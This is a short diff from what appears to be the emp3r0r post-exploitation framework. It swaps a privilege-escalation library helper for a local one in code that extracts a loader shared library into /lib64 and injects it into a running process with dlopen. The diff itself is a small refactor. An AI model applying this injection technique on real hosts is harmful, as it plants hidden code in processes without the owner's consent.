@@ -15,7 +15,6 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/file"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	golpe "github.com/jm33-m0/go-lpe"
 )
 
 // inject a shared library using dlopen
@@ -97,7 +96,7 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 		so_path = fmt.Sprintf("/lib64/%s", NameTheLibrary())
 	}
 	if !util.IsFileExist(so_path) {
-		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
+		out, err := file.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
